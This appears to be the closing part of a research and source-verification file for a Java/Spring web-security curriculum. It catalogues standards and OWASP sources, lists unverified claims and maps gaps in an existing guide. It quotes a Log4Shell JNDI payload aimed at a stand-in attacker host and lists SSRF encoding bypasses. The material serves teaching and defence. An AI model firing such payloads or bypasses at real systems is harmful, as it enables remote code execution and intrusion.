| draft-ietf-httpbis-rfc6265bis (Aug 2026) | https://httpwg.org/http-extensions/draft-ietf-httpbis-rfc6265bis.html | **Every attribute with its section number** (5.6.1 `Expires`, 5.6.2 `Max-Age` taking precedence, 5.6.3 `Domain`, 5.6.4 `Path`, 5.6.5 `Secure`, 5.6.6 `HttpOnly`, 5.6.7 `SameSite` with Strict/Lax/None, `None` requiring `Secure`, unrecognised values treated as Lax, and 5.6.7.2's "Lax-allowing-unsafe"); **the limits — name+value ≤ 4096 octets, per-attribute ≤ 1024 octets, ≤ 50 cookies per domain, ≤ 3000 total; the 400-day / 34 560 000 s cap ("SHOULD NOT be greater than")**; the `__Secure-` (5.4.1, case-insensitive) and `__Host-` (4.1.3.2 — `Secure`, `Path=/`, no `Domain`, host-only) prefix rules; the 4.1.1 cookie-name/value grammar; the 5.1.3 domain-matching and 5.1.4 path-matching algorithms; **§ 8.5–8.6's explicit "cookies lack integrity" and "`Secure` does not provide integrity against an active network attacker"**; § 5.2's same-site-uses-registrable-domain vs same-origin distinction. **The `Partitioned`/CHIPS attribute was NOT in the fetched draft text** — it must be sourced from the Privacy CG CHIPS spec before the bible states its semantics. `[RESEARCH]` |
| CHIPS proposal | https://github.com/privacycg/CHIPS/blob/main/README.md | The `Partitioned` attribute being double-keyed by cookie domain + top-level site, requiring `Secure`, and combining with `SameSite=None`. `[RESEARCH]` — re-read before writing. |
| MDN — CORS guide | https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS | **The exact simple-request definition** (GET/HEAD/POST; safelisted headers `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`, `Range`; `Content-Type` limited to `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`; no upload listeners; no `ReadableStream`); the full request/response header set; **the seven CORS-safelisted response headers exposed by default** (`Cache-Control`, `Content-Language`, `Content-Length`, `Content-Type`, `Expires`, `Last-Modified`, `Pragma`); **the wildcard-with-credentials prohibition for `Allow-Origin`, `Allow-Headers` and `Allow-Methods`**; the `Vary: Origin` requirement; the WebKit extra restrictions |
| W3C CSP Level 3 (WD, 13 Aug 2026) + MDN CSP header reference | https://www.w3.org/TR/CSP3/ , https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy | **The complete directive list grouped into fetch / document / navigation / reporting / other**, including `script-src-elem`, `script-src-attr`, `style-src-elem`, `style-src-attr`, `fenced-frame-src`, `worker-src`, `manifest-src`, `base-uri`, `sandbox`, `form-action`, `frame-ancestors`, `report-to`, `require-trusted-types-for`, `trusted-types`, `upgrade-insecure-requests`; **the deprecated set** (`report-uri`, `prefetch-src`, `block-all-mixed-content`); **the complete source-expression keyword list** (`'none'`, `'self'`, `'unsafe-inline'`, `'unsafe-eval'`, `'unsafe-hashes'`, `'strict-dynamic'`, `'report-sample'`, `'wasm-unsafe-eval'`, `'inline-speculation-rules'`, `'trusted-types-eval'`, `nonce-`, `sha256-/384-/512-`, host and scheme sources); `'strict-dynamic'`'s trust-propagation and allowlist-ignoring semantics |
| OWASP Password Storage Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html | **Argon2id `m=47104 (46 MiB), t=1, p=1` through `m=7168 (7 MiB), t=5, p=1`; scrypt `N=2^17 (128 MiB), r=8, p=1` through `N=2^13 (8 MiB), r=8, p=10`; bcrypt work factor minimum 10 and the 72-byte maximum input; PBKDF2 iteration counts — HMAC-SHA256 600 000, HMAC-SHA512 220 000, HMAC-SHA1 1 400 000**; the pre-hashing null-byte collision problem and the recommended construction `bcrypt(base64(hmac-sha384(data:$password, key:$pepper)), $salt, $cost)`; password shucking; pepper stored outside the DB in a vault/HSM and the forced-reset cost of rotating it; the legacy-upgrade approach |
| OWASP SSRF Prevention Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html | **The case-1 (allowlisted) vs case-2 (arbitrary) taxonomy with application-layer and network-layer defences for each**; the named Java validators (`InetAddressValidator.isValid`, `DomainValidator.isValid` from Apache Commons Validator); **the ranges to reject — 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, ::1/128, 169.254.169.254, metadata.googleapis.com, link-local, 0.0.0.0/8, 224.0.0.0/4, fd00::/8**; the encoding bypasses (decimal 3232235777, octal 0300.0250.001.001, hex 0xC0A80101, IPv6-mapped ::ffff:127.0.0.1); DNS rebinding and TOCTOU; the resolve-then-validate rule; disable redirects; **never accept a complete URL from the user because parsers differ**; the 20-character cryptographic-token webhook challenge; the IMDSv1→IMDSv2 recommendation |
| OWASP XSS Prevention + DOM-based XSS Prevention Cheat Sheets | https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html , https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html | The five output-encoding contexts (HTML body, HTML attribute, JavaScript, CSS, URL); **the safe-sink list** (`textContent`, `insertAdjacentText`, `setAttribute` with a hardcoded name, `formfield.value`) and the "use the right sink" primary fix; **the dangerous contexts where encoding is insufficient** (event handlers, `eval`, `javascript:` in CSS/URL); **Trusted Types via `Content-Security-Policy: require-trusted-types-for 'script'` making DOM XSS sinks reject plain strings — "one of the few controls that eliminates entire classes of DOM XSS rather than mitigating them"** |
| OWASP File Upload Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html | Extension allowlisting with double-extension and null-byte bypass protection; `Content-Type` explicitly untrusted ("trivial to spoof"); file-signature/magic-byte validation as a non-sole control; **randomised (UUID/GUID) filenames** with a character allowlist and traversal blocking if user names are kept; **the three-tier storage hierarchy — separate host, outside webroot, or inside webroot write-only**; least-privilege file permissions; image rewriting and Apache POI for documents; "avoid ZIP files"; size limits and decompression bombs; abuse reporting. **The cheat sheet does NOT document `Content-Disposition`, `nosniff`, the SVG/HTML XSS vector or sandboxing — those leaves come from elsewhere and are tagged accordingly.** |
| Spring Security reference — Architecture | https://docs.spring.io/spring-security/reference/servlet/architecture.html | **The documented default filter order** (`DisableEncodeUrlFilter`, `WebAsyncManagerIntegrationFilter`, `SecurityContextHolderFilter`, `HeaderWriterFilter`, `CsrfFilter`, `LogoutFilter`, `UsernamePasswordAuthenticationFilter`, `DefaultLoginPageGeneratingFilter`, `DefaultLogoutPageGeneratingFilter`, `BasicAuthenticationFilter`, `RequestCacheAwareFilter`, `SecurityContextHolderAwareRequestFilter`, `AnonymousAuthenticationFilter`, `ExceptionTranslationFilter`, `AuthorizationFilter`) — **note the page served was the 7.1.1 documentation, so the ordering and the presence of `CorsFilter` must be re-verified against `FilterOrderRegistration` for the 6.5.x baseline**; `DelegatingFilterProxy`'s lazy bean lookup; **`FilterChainProxy` clearing the `SecurityContext` to avoid leaks and applying the `HttpFirewall`**; only the first matching `SecurityFilterChain` running; the `SecurityContextHolder`→`SecurityContext`→`Authentication`→`GrantedAuthority` chain; `AuthenticationManager`/`ProviderManager`/`AuthenticationProvider`; **`ExceptionTranslationFilter`'s exact behaviour on `AuthenticationException` (clear context, save request, invoke `AuthenticationEntryPoint`) versus `AccessDeniedException` (invoke `AccessDeniedHandler`)**; `RequestCache`/`HttpSessionRequestCache`/`NullRequestCache`; `SecurityContextRepository`; `addFilterBefore`/`After`/`At` and the placement rules of thumb. `[RESEARCH]` |
| Spring Security reference — CSRF | https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html | `CsrfFilter`, `CsrfToken`, `CsrfTokenRequestHandler`, `CsrfTokenRepository`; `HttpSessionCsrfTokenRepository` as default; `CookieCsrfTokenRepository.withHttpOnlyFalse()` writing `XSRF-TOKEN` and reading `X-XSRF-TOKEN`; **`XorCsrfTokenRequestAttributeHandler` as the default with BREACH protection (randomness encoded per request)** vs `CsrfTokenRequestAttributeHandler`; the `_csrf` parameter and `X-CSRF-TOKEN`/`X-XSRF-TOKEN` headers; the `_csrf` and `CsrfToken.class.getName()` request attributes; **deferred loading via `DeferredCsrfToken` and the `setCsrfRequestAttributeName(null)` opt-out**; **the protected methods POST/PUT/DELETE/PATCH with GET/HEAD/OPTIONS/TRACE exempt**; `csrf().spa()`; `ignoringRequestMatchers`; `CsrfRequestDataValueProcessor`; the `spring-security-test` `csrf()` post-processors |
| Spring Security 7.0 feature and migration coverage | https://stevenpg.com/posts/ultimate-guide-spring-security-7-migration/ , https://dev.to/jamilxt/spring-security-7-mfa-modular-config-and-what-breaks-4pnf , https://2026.springio.net/sessions/new-in-spring-security-7-mfa-oauth2-and-more/ | Spring Security 7.0's feature set — **first-class MFA, passkeys/WebAuthn, one-time-token login, Password4j encoders, `AuthorizationManagerFactory`, `Authentication.Builder`, SPA-friendly CSRF DSL, PKCE enabled by default, the Kerberos and Authorization Server module merge** — and the breaking changes — **lambda DSL mandatory with `.and()` removed, `authorizeRequests()` removed, `MvcRequestMatcher`/`AntPathRequestMatcher` replaced by `PathPatternRequestMatcher`, `AuthorizationManager#check` removed, OAuth2 password grant removed, OpenSAML 4 support removed**. **Secondary sources — the entire 7.0 delta is tagged `[RESEARCH]` and must be verified against the official Spring Security 7 release notes and migration guide on docs.spring.io before the bible commits to it.** |
| Java Serialization Filters guide (JDK 21) | https://docs.oracle.com/en/java/javase/21/core/java-serialization-filters.html | The two filter kinds (JVM-wide and stream-specific); `jdk.serialFilter`; `ObjectInputFilter`, `Config.createFilter(String)`, `setObjectInputFilter`; the existence of array-size, graph-depth, total-reference and stream-size limits. **The fetched page did not contain the full pattern grammar or the API detail** — supplied by JEP 290 below. |
| JEP 290 — Filter Incoming Serialization Data | https://openjdk.org/jeps/290 | **The exact filter-pattern grammar**: semicolon-separated patterns; limit patterns `maxdepth=`, `maxrefs=`, `maxbytes=`, `maxarray=`; class patterns matched left to right with `!` prefix to reject, `module/classname` form, `.**` suffix for package-and-subpackages, `.*` suffix for a package, `*` suffix for prefix match, exact class match, else undecided. **`ObjectInputFilter.Status` = `UNDECIDED`/`ALLOWED`/`REJECTED`**; **`FilterInfo` accessors `serialClass()`, `arrayLength()`, `depth()`, `references()`, `streamBytes()`** |
| JEP 415 — Context-Specific Deserialization Filters | https://openjdk.org/jeps/415 (via search) | The JVM-wide **filter factory** invoked per `ObjectInputStream` creation, `jdk.serialFilterFactory`, and the dynamic/context-specific model versus JEP 290's single static filter; Java 17 as the delivering release. `[RESEARCH]` — read the JEP directly before writing the factory contract. |
| OWASP ASVS 5.0.0 | https://github.com/OWASP/ASVS + https://sentrixhub.com/owasp-asvs-5-0-table-of-contents/ | **The 17-chapter structure**: V1 Encoding and Sanitization, V2 Validation and Business Logic, V3 Web Frontend Security, V4 API and Web Service, V5 File Handling, V6 Authentication, V7 Session Management, V8 Authorization, V9 Self-contained Tokens, V10 OAuth and OIDC, V11 Cryptography, V12 Secure Communication, V13 Configuration, V14 Data Protection, V15 Secure Coding and Architecture, V16 Security Logging and Error Handling, V17 WebRTC; ~350 requirements. **The chapter list came via a secondary summary — verify against the ASVS 5.0.0 release PDF/repo before publishing chapter numbers, and confirm whether 5.0 retains the L1/L2/L3 level model.** `[RESEARCH]` |
| OWASP API Security Top 10:2023 | https://orca.security/resources/blog/owasp-api-security-top-10/ , https://salt.security/blog/owasp-api-security-top-10-explained | **The full list with identifiers**: API1 BOLA, API2 Broken Authentication, API3 BOPLA, API4 Unrestricted Resource Consumption, API5 BFLA, API6 Unrestricted Access to Sensitive Business Flows, API7 SSRF, API8 Security Misconfiguration, API9 Improper Inventory Management, API10 Unsafe Consumption of APIs; and the 2019→2023 mapping (BOPLA absorbing Excessive Data Exposure + Mass Assignment; Unrestricted Resource Consumption replacing Lack of Resources & Rate Limiting). **Secondary sources — verify against owasp.org/API-Security.** `[RESEARCH]` |
| WebAuthn Level 3 + passkey material | https://www.w3.org/TR/webauthn-3/ , https://www.corbado.com/blog/webauthn-resident-key-discoverable-credentials-passkeys , https://blog.timcappalli.me/p/webauthn-3/ , https://ppc.land/webauthn-level-3-lets-one-passkey-cover-at-least-five-related-domains/ | `navigator.credentials.create()` = registration/attestation ceremony, `.get()` = authentication/assertion ceremony; the attestation and assertion definitions; the authenticator as a cryptographic entity that registers and later asserts possession; **discoverable credential (W3C 2021) == resident key (CTAP 2018)**, with the user handle stored on the authenticator enabling usernameless login; **Level 3's compound attestation** and **Related Origin Requests letting one passkey cover a set of related domains**; Level 3's CR status (March 2025). **The Related-Origin-Requests limit ("at least five") and the compound-attestation detail are from secondary sources and must be verified against the W3C spec.** `[RESEARCH]` |
| OpenID Connect Core 1.0 + Back-Channel Logout 1.0 | https://openid.net/specs/openid-connect-core-1_0-final.html , https://openid.net/specs/openid-connect-backchannel-1_0-final.html | The hybrid flow's front-channel ID token plus back-channel access/refresh tokens; **`nonce` REQUIRED in the implicit/hybrid flows**; **`at_hash` defined as the base64url encoding of the left-most half of the hash of the ASCII `access_token`**, and `c_hash` doing the same for the code; **back-channel logout using an HTTP POST of a `logout_token` to the registered URI, with `nonce` MUST NOT be present so a logout token cannot be substituted for an ID token** |
| PAR / JAR / RAR context | https://mrutyunjaypatil.medium.com/oauth-2-0-openid-connect-the-complete-guide-to-what-the-standards-actually-say-e92f040a4251 , https://curity.io/resources/learn/oauth-hybrid-flow/ | PAR pushing the request over a back channel to remove URL-length limits and front-channel tampering; PAR+JAR preventing parameter injection. **Secondary — the write pass must cite RFC 9126 / RFC 9101 / RFC 9396 directly for any normative statement.** `[RESEARCH]` |
| Cross-origin isolation / Fetch Metadata material | https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/cross_origin_isolation.md , https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cross-Origin_Resource_Policy , https://web.dev/articles/fetch-metadata , https://www.w3.org/TR/fetch-metadata/ , https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Sec-Fetch-Site | COOP restricting cross-origin popup/`window.open` references to stop cross-site leaks and Spectre-class attacks; COEP requiring subresources to be same-origin or carry CORP; CORP blocking `no-cors` cross-origin embedding; **cross-origin isolation requiring COOP `same-origin` + COEP and placing the page in an origin-keyed process**; site isolation; `Sec-Fetch-Site` describing the initiator→resource origin relationship and being set automatically by the browser on secure endpoints, making it a trustworthy server-side signal; **the open Spring Security issue for Fetch-Metadata-based CSRF protection (spring-projects/spring-security#18361)** `[RESEARCH]` |
| Log4Shell material | https://www.rapid7.com/blog/post/ra-cve-2021-44228-log4shell-analysis/ , https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/ , https://www.huntress.com/threat-library/vulnerabilities/cve-2021-44228 | The `${jndi:ldap://attacker/a}` payload logged from any attacker-influenced field (HTTP headers, query parameters, application attributes); message-lookup substitution; the LDAP fetch and remote class execution; **affected versions 2.0-beta9 through 2.15.0 excluding 2.12.2/2.12.3/2.3.1**. **The exact fixed-version matrix and the follow-on CVEs (45046, 45105, 44832) must be confirmed against the Apache advisory.** `[RESEARCH]` |
| Spring4Shell material | https://github.com/advisories/GHSA-36p3-wjmg-h94x , https://www.trendmicro.com/en_us/research/22/d/cve-2022-22965-analyzing-the-exploitation-of-spring4shell-vulner.html , https://www.sysdig.com/blog/cve-2022-22965-spring-core-spring4shell | The data-binding mechanism: request parameters bound to a non-`@RequestBody` POJO, the `class` variable exposing the object's `Class`, and the child-property chain to the classloader; **the JDK 9+ precondition (expanded `Class` method access) and the Tomcat-WAR precondition — a Spring Boot executable jar is not exploitable**. **Fixed-version numbers must be confirmed against the Spring advisory.** `[RESEARCH]` |
| Supply-chain / SLSA / SBOM material | https://www.practical-devsecops.com/slsa-framework-guide-software-supply-chain-security/ , https://arxiv.org/pdf/2512.21781 , https://arxiv.org/pdf/2605.03309 , https://medium.com/@27.rahul.k/supply-chain-security-for-java-0651c1e21976 | **SLSA v1.0 narrowing to the build track with levels 0–3** (v0.1 had four tracks and levels 1–4), L1 = provenance exists, L2 = hosted build platform producing tamper-evident provenance, L3 = hardened build; **CycloneDX as OWASP-maintained, SPDX as Linux Foundation / ISO/IEC 5962:2021**; **the explicit limitation that an SBOM answers "what is in this artifact" but not "which registry distributed it"**; dependency confusion exploiting public-before-private resolution and provenance verification as a detection; Sigstore cosign signing plus SLSA provenance attestations in a Java pipeline. **Secondary sources — verify the SLSA level definitions against slsa.dev before publishing them.** `[RESEARCH]` |
| Threat-modelling material | https://shostack.org/resources/threat-modeling , https://inventivehq.com/blog/threat-modeling-stride-dread-complete-guide , https://strobes.co/blog/threat-modeling-explained-stride/ , https://cyberdefenders.org/cybersecurity-glossary/threat-modeling/ | **The Threat Modeling Manifesto's four questions**; the DFD with processes, data stores, external entities, flows and **trust boundaries** as the artifact, with the "almost every interesting threat lives on a trust boundary" framing; **STRIDE's six categories**; the mitigate/eliminate/transfer/accept decision set; **DREAD as a STRIDE add-on that has been largely abandoned for being complex and subjective**; attack trees as goal-at-the-root with OR/AND decomposition; PASTA/OCTAVE/LINDDUN as alternatives |
| AppSec interview question corpus | https://tib3rius.com/interview-questions.html | Used as a **completeness probe** and it added a large number of leaves this syllabus would otherwise have missed: web cache deception vs poisoning, `TE.TE` and `CL.0` request smuggling, session fixation's two preconditions, password-reset flow flaws, account-enumeration techniques, base64 vs base64url, encoding vs encryption vs hashing, "name 5+ types of XSS", **DOM clobbering**, HTML-submission-with-safety, boolean-error blind SQLi, NoSQL injection, the CORS-preflight-prevention conditions, CSRF-immune request attributes, IDOR's difference from other access-control flaws, **testing vertical access control across 20 roles and 300 requests**, **JWKs vs JKUs**, **GraphQL batching as a rate-limit bypass**, `Sec-WebSocket-Key`'s purpose, SSTI identification and exploitation, file-upload check enumeration, **XML parameter entities and their XXE limits**, business-logic testing, **mass assignment**, **type juggling**, insecure-deserialization exploitation and remediation, SSRF filter bypasses, blind command injection detection, **prototype pollution (client and server)**, `sessionStorage` preservation, `'unsafe-inline'` semantics, **HTTP parameter pollution for WAF bypass**, reasons URL query parameters are insecure, open-redirect exploitation, **CRLF injection**, TLS misconfigurations, **403 bypass techniques**, CAPTCHA weaknesses, **web race conditions**, **formula/CSV injection**, HTML injection, and pentest scoping questions |
| Java/Spring security interview corpus | https://medium.com/software-engineering-interview-essentials/20-web-security-interview-questions-every-developer-should-know-8238733f131e , https://www.hirist.tech/blog/top-25-spring-security-interview-questions-and-answers/ , https://howtodoinjava.com/interview-questions/spring-security-interview-questions/ | Completeness probe for § 5.1: AuthN vs AuthZ, Role vs Authority in Spring Security, XSS vs CSRF distinction, Spring Security's CSRF-by-default, JWT structure, **the JWT attack list (no signature verification, `none`, embedded/remote keys, weak-key brute force, algorithm confusion)**, OAuth mechanics, and the senior-level framing (stateless security for microservices, resource/authorization servers, **token revocation / refresh / key rotation strategies**, third-party IdP integration) |
| Token-storage debate corpus | https://www.wisp.blog/blog/understanding-token-storage-local-storage-vs-httponly-cookies , https://dev.to/cotter/localstorage-vs-cookies-all-you-need-to-know-about-storing-jwt-tokens-securely-in-the-front-end-15id , https://ianlondon.github.io/posts/dont-use-jwts-for-sessions/ | The adversarial angle: **"JWTs mean no CSRF" is false when the JWT is in a cookie — CSRF is a property of the credential-transmission mechanism, not the credential format**; `HttpOnly` protecting the value but not the use; and the **in-memory access token + `HttpOnly` refresh cookie hybrid** as the current recommendation |
| Java crypto usage material | https://docs.oracle.com/en/java/javase/25/security/java-cryptography-architecture-jca-reference-guide.html , https://aquilax.ai/blog/cryptographic-implementation-vulnerabilities , https://gist.github.com/patrickfav/7e28d4eb4bf500f7ee8012c4a0cf7bbf | **Never reuse a GCM nonce with the same key — reuse collapses the security of AES-GCM**; keep the **GCM tag at 128 bits**; `SecureRandom` for IVs/nonces/salts/keys with `getInstanceStrong()` blocking and the default being non-blocking; constant-time comparison for HMAC/token verification (`MessageDigest.isEqual`); padding oracles decrypting arbitrary ciphertext without the key; the JCA's provider-agnostic structure. **The JCA page fetched was the Java 25 edition — re-check anything version-specific against the Java 21 guide.** `[RESEARCH]` |
| Secrets/KMS/rotation material | https://www.digitalapplied.com/blog/secrets-management-api-key-rotation-2026-engineering-reference , https://www.hashicorp.com/en/products/vault/features , https://blog.gitguardian.com/top-secrets-management-tools/ | **Envelope encryption with a DEK wrapped by a KEK in a cloud KMS, HSMs only where regulation requires**; **Vault's dynamic secrets** minting a credential on request with a TTL and revoking at expiry, plus transit and PKI engines; **OIDC federation replacing long-lived keys with short-lived exchangeable tokens**; the rotation cadences commonly quoted (DB passwords 30–90 days, API keys 90 days) — **presented as industry convention, not as a standard, and the bible must say so** |
| TLS 1.3 practice material | https://oneuptime.com/blog/post/2026-01-25-tls-13-best-practices/view , https://cybersecify.com/blog/tls-1-3-modern-standard/ , https://firstprinciplesengineering.tech/01-fundamentals/04-networking/03-tls-and-mtls | TLS 1.2's 2-RTT vs 1.3's 1-RTT (0-RTT on resumption) with the client key share in the first flight; **TLS 1.3's five AEAD cipher suites versus TLS 1.2's 37-in-RFC-5246 and 350+ registered**; **0-RTT early-data replay**; the certificate being encrypted in the 1.3 handshake; OCSP stapling removing the CA round trip; **revocation at scale meaning stapling or short-lived certs, never CRL downloads**; HSTS preload as a sticky commitment |

**Searches and fetches that failed or returned nothing usable.**

1. **The OWASP Top 10:2025 introduction and methodology pages were not fetched.** `owasp.org/Top10/2025/`
   returned only the category index. Consequently **the CWE-mapping counts, the incidence-rate
   figures, the contributed-data-set size, and above all the authoritative statement of *where SSRF
   went* are unverified.** § 1.17.1–1.17.3 must be re-sourced from
   `owasp.org/Top10/2025/0x00_2025-Introduction/` and `.../0x01_2025-About_OWASP/` before the bible
   states any of it.
2. **The `Partitioned` attribute is absent from the fetched rfc6265bis text.** § 1.5.14 must be
   sourced from the Privacy CG CHIPS specification, and the bible must not attribute `Partitioned`
   to rfc6265bis.
3. **The Spring Security default filter order was read from the 7.1.1 documentation, not the 6.5.x
   baseline this file targets**, and the fetched list (15 filters) is the *minimal default* list,
   not the full `FilterOrderRegistration` ordering that § 3.5.4 enumerates. The 30-filter list in
   § 3.5.4 is **assembled from recall plus the fetched subset** and every entry must be verified
   against `FilterOrderRegistration` source before publication.
4. **No official Spring Security 7.0 release notes or migration guide was fetched.** Every 7.0 claim
   (MFA, passkeys, one-time-token login, `AuthorizationManagerFactory`, `Authentication.Builder`,
   `csrf().spa()`, `PathPatternRequestMatcher`, PKCE default, password-grant removal, OpenSAML 4
   removal, Password4j) comes from third-party write-ups and is tagged `[RESEARCH]`.
5. **ASVS 5.0.0's chapter list came from a secondary summary**, not from the release artifact. The
   chapter numbering, the requirement count and whether the L1/L2/L3 model survives into 5.0 must
   all be checked against the OWASP/ASVS repository.
6. **JEP 415 was not fetched directly** — its content came via search summaries. The filter-factory
   contract in § 2.13.7 and § 3.10.8 must be read from `openjdk.org/jeps/415`.
7. **No authoritative source was fetched for the OAuth extension RFCs** (9126 PAR, 9101 JAR, 9396
   RAR, 9449 DPoP, 8705 mTLS, 8693 token exchange, 9068 access-token profile, 9207 `iss`, 9470
   step-up). Their existence and purpose are stated from recall plus RFC 9700's references; **every
   parameter name and claim name in § 2.6.15–2.6.21 must be verified against the RFC itself.**
8. **The WebAuthn Level 3 specifics** (compound attestation, the Related Origin Requests limit,
   conditional UI naming) are from secondary sources and must be checked against
   `w3.org/TR/webauthn-3/`.
9. **No first-party, attributable postmortem with citable figures** was located for a
   web-application security incident in the QuizStakes shape (a payments/gambling platform). § 3.12
   therefore uses only well-documented public incidents and must not invent an internal narrative.
10. **The MySQL JDBC `useServerPrepStmts` default** (§ 3.11.2) and the exact behaviour of
    `ClientPreparedStatement` were not verified against Connector/J documentation. Do not publish
    the default value without checking it.
11. **No source was fetched for the bcrypt `$2a$`/`$2b$`/`$2x$`/`$2y$` version history** (§ 3.6.2) or
    for the exact bcrypt output-format field widths. Verify before publishing the format string.
12. **The "rotate DB passwords every 30–90 days" and "API keys every 90 days" figures** are industry
    convention from a secondary source, not a standard. Present them as convention or drop the
    numbers.
13. **CVSS 4.0's metric-group names** (§ 1.2.17) were not verified against the FIRST specification.
14. **No university syllabus or textbook table of contents** was located that maps cleanly onto this
    file's scope; the curriculum angle was covered instead by **ASVS's chapter structure** and the
    **OWASP Cheat Sheet Series index**, which together are a better-shaped curriculum for this
    topic than any course outline found.

**Carried-forward unverified items the write pass must re-check before writing a number or an exact
name:** items 1–14 above, plus every leaf tagged `[RESEARCH]` in Parts 1–5.

---

## Gaps vs the current guide

`src/topics/13-web-security.md` is **361 lines** across **13 numbered sections** plus a 27-item
`## Atomic concept checklist`. It is a genuinely good short guide — its mechanism-first opening
paragraph, its prepared-statement explanation, its CORS framing, its salt-versus-work-factor split
and its enumeration-timing paragraph are all better than typical — and **every concept in it
survives as a leaf.** The table below is the work order.

| Syllabus area | Present in `src/topics/13-web-security.md` | Missing | Shallow |
|---|---|---|---|
| §1.1 why the discipline exists | the opening paragraph's "graded on mechanism" framing (excellent, must survive verbatim) | the whole section: the adversarial-input premise, the asymmetry argument, the attack economics at 2.4M accounts, security-as-the-product for a regulated platform, the four-ways-controls-reach-production ranking, shift-left-vs-right, the three framing questions, the ranked reading list | the "mechanism earns the point" sentence is the guide's thesis and must become the bible's opening section, not one paragraph |
| §1.2 vocabulary | AuthN/AuthZ and 401/403 in § 1; nothing else | the whole section: CIA+authenticity+non-repudiation, threat/vuln/risk, trust boundary, the threat-actor taxonomy, **the web-vs-network-vs-related-domain attacker models**, IAL/AAL/FAL, Saltzer & Schroeder, defence-in-depth's independence requirement, fail-closed, allowlist-vs-denylist, **the sanitize/validate/encode/escape four-way split**, the encode/encrypt/hash/sign/MAC five-way split, capability-vs-identity, nonce/salt/pepper/IV, CWE/CVE/CVSS/EPSS/KEV, **the confused-deputy unification of CSRF/SSRF/clickjacking** | — |
| §1.3 browser security model | one sentence in § 7 ("the browser's same-origin policy stops JavaScript on evil.com from reading responses") | **the entire subject**: the origin triple and its serialization, the origin comparison table, **site vs origin and the eTLD+1/PSL mechanism**, what SOP restricts per resource type, the sends-vs-reads proof, `document.domain`'s removal, `postMessage`, **the XS-leaks class**, site isolation and Spectre, mixed content, secure contexts, storage partitioning | the single sentence is correct and is doing the work of a whole section |
| §1.4 HTTP as a security substrate | scattered — the query-string warning in § 3, `nosniff` in § 10 | **the entire subject**: the attacker-controlled-input enumeration, the HTTP auth framework and `WWW-Authenticate`, Basic/Digest analysis, **401-vs-403-vs-404 as an information-disclosure decision**, error responses as a leak surface (A10:2025), `Referer`, **the nine places a URL leaks**, the `Host` header, **`X-Forwarded-For` and the trusted-proxy rule**, parsing differentials, `Content-Disposition`, `TRACE`, cache-as-a-boundary, request-size limits, `Clear-Site-Data` | — |
| §1.5 cookies | § 2's five-flag list (`HttpOnly`, `Secure`, `SameSite`, `Path`, `Max-Age`) | **the full attribute set with semantics**, the 4096/1024-octet and 400-day limits, **`Domain` widening rather than narrowing**, **`Path` is not a security boundary**, `Secure` provides no integrity, the `SameSite` value semantics with the Lax-allowing-unsafe window, **`__Secure-` and `__Host-` prefixes**, **cookie tossing by a related-domain attacker**, `Partitioned`/CHIPS, duplicate-name shadowing, cookies ignoring ports, the exact QuizStakes `Set-Cookie` line, Spring's cookie properties, the `Set-Cookie` folding exception | a five-item flag list for a subject with nineteen leaves |
| §1.6 session management | § 2's server-side-session bullets (revocation, lookup cost, shared store, CSRF) | session-id entropy requirements, the storage-location table, **the lifecycle state machine**, **session fixation and the regenerate-on-privilege-change rule with Spring's four strategies**, idle vs absolute vs renewal timeouts with the 30–90-minute operator numbers, **logout done properly**, concurrent-session control, remember-me, sticky sessions as a security choice, context binding, the auditable events, `SessionCreationPolicy` and `SecurityContextRepository` | the three bullets are right and cover a third of the subject |
| §1.7 authentication basics | § 5 — the no-recoverable-storage argument, the no-plain-hashing argument, salt, work factor, memory hardness, Argon2id/bcrypt/PBKDF2 selection, the 72-byte note, `DelegatingPasswordEncoder`, pepper, constant-time compare, the NIST 800-63B pointer (all excellent, all must survive) | the factor taxonomy, the assurance-level framing, **the registration/onboarding attack surface**, **the current parameter numbers** (the guide says "cost 12, ~250ms" and no Argon2/scrypt/PBKDF2 figures), **the null-byte pre-hash collision and the HMAC-pepper construction**, **password shucking**, `upgradeEncoding` as a mechanism, **NIST 800-63B-4's full rule set**, **HIBP's k-anonymity mechanism**, **the whole password-reset flow**, non-human credentials, the Spring authentication-mechanism list | the bcrypt-cost-12 number needs re-basing on the current OWASP parameters, and "NIST recommends length and breach-checking" needs the actual rules |
| §1.8 authorization basics | § 1 — IDOR named as the most common real vulnerability, the `findByIdAndUserId` fix, RBAC/ABAC/ReBAC with the "start with RBAC plus an ownership check" advice (all strong, all must survive) | the decision-function framing, **A01/API1/API5 mapping**, **BOPLA = excessive exposure + mass assignment**, BFLA, deny-by-default, the `ROLE_` prefix trap, ReBAC/Zanzibar detail, **the where-does-the-decision-run table and the proof the object check cannot move up**, PDP/PEP vocabulary, **the QuizStakes no-permissions-in-the-token rule as the section's spine**, multi-tenancy, operator-vs-client domains, the test matrix | the IDOR paragraph is the guide's best passage and needs the query-level-filtering proof underneath it |
| §1.9 transport basics | § 6 — the three guarantees, "nothing about the client, nothing about the payload", TLS 1.2 floor / 1.3 preferred, HSTS, redirect, encrypt internal traffic, mTLS with its cost (all must survive) | the on-path-attacker threat, **the certificate as a name-to-key binding and the four validation checks**, the trust store, HSTS's parameters and the preload commitment, the redirect-is-a-fallback proof, certificate lifecycle as operational risk, TLS termination, **the Java `KeyStore`/`TrustStore`/SSL-bundle surface** | § 6 is 12 lines and is correct on every one of them |
